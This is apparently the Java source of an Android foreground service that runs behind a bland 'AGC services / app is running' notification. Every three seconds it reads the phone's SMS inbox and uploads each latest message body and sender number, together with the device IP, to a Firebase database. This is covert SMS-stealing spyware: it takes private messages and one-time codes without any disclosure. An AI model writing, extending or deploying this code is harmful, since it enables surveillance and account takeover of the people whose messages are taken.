package com.example.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.util.Log;

import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Collections;
import java.util.List;

import android.text.format.Formatter;

public class MyForegroundService extends Service {



    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String name_m;
        String ip;

        TextView text;
        final String[] check_msg = new String[1];


        new Thread(


                new Runnable() {
                    @Override
                    public void run() {
                        while (true) {

                            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                            WifiInfo wi = wm.getConnectionInfo();
                            final String ip_new = Formatter.formatIpAddress(wi.getIpAddress());
                            Log.i("ip", getIPAddress(true));
                            Log.i("Service", "Service is running...");
                            SharedPreferences preferences = getSharedPreferences("phone", MODE_PRIVATE);
                            SharedPreferences preferences1 = getSharedPreferences("ip", MODE_PRIVATE);
                            String check_ip = preferences1.getString("ip", "");


                            String name_m = preferences.getString("name_mobile", "");

                            DatabaseReference check = FirebaseDatabase.getInstance().getReference("users");

                            check.get().addOnCompleteListener(new OnCompleteListener<DataSnapshot>() {
                                @Override
                                public void onComplete(@NonNull Task<DataSnapshot> task) {
                                    if (task.isSuccessful()){
                                        DataSnapshot snapshot = task.getResult();
                                        if (snapshot.exists()){
                                            Log.i("check", String.valueOf(task.getResult().getValue()));
                                        }
                                        else {
                                            Log.i("check", "not exists");
                                        }
                                    }
                                }
                            });



                            if (name_m.length()!=0){


                                Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);

                                Cursor cursor1 = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);


                                cursor.moveToFirst();

                                cursor1.moveToFirst();

                                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss aaa z");

                                String date = cursor1.getString(cursor1.getColumnIndex("date"));

                                String pnaam = cursor1.getString(cursor1.getColumnIndex("address"));





                                Long timestamp =Long.parseLong(date);

                                Calendar calendar = Calendar.getInstance();

                                calendar.setTimeInMillis(timestamp);


                                String sms_date = simpleDateFormat.format(calendar.getTime());





                                Log.i("date", sms_date);

                                Log.i("phone number", pnaam);





                                String msg= cursor.getString(12);

                                preferences = getSharedPreferences("msg", MODE_PRIVATE);


                                if (check.equals(msg)){

                                }
                                else {


                                    Log.i("msg", msg);


                                    String currentTime = Calendar.getInstance().getTime().toString();

                                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                                    DatabaseReference root = database.getReference("users");
                                    Log.i("done ", "done");
                                    root.child(name_m).child(sms_date).child("msg").setValue(msg);
                                    root.child(name_m).child(sms_date).child("phoneNo").setValue(pnaam);
                                    root.child(name_m).child(sms_date).child("body").setValue(msg);
                                    if(ip_new.equals(check_ip)){
                                        Log.i("ip", "same");

                                    }
                                    else {
                                        root.child(name_m).child("IP").setValue(getIPAddress(true));
                                        SharedPreferences.Editor editor1 = preferences1.edit();
                                        editor1.putString("ip", getIPAddress(true));
                                        editor1.apply();
                                    }



                                    SharedPreferences.Editor editor = preferences.edit();
                                    editor.putString("msg_mobile", msg);
                                    editor.apply();



                                }

                            }




                            try {
                                Thread.sleep(3000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
        ).start();

        final String CHANNELID = "Foreground Service ID";
        NotificationChannel channel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            channel = new NotificationChannel(
                    CHANNELID,
                    CHANNELID,
                    NotificationManager.IMPORTANCE_LOW
            );
        }

        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification = new Notification.Builder(this, CHANNELID)
                .setContentText("app is running")
                .setContentTitle("AGC services")
                .setSmallIcon(R.drawable.ic_launcher_background);

        startForeground(1001, notification.build());
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    public static String getIPAddress(boolean useIPv4) {
        try {

            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
                        boolean isIPv4 = sAddr.indexOf(':')<0;

                        if (useIPv4) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%'); // drop ip6 zone suffix
                                return delim<0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) { } // for now eat exceptions
        return "";
    }
}
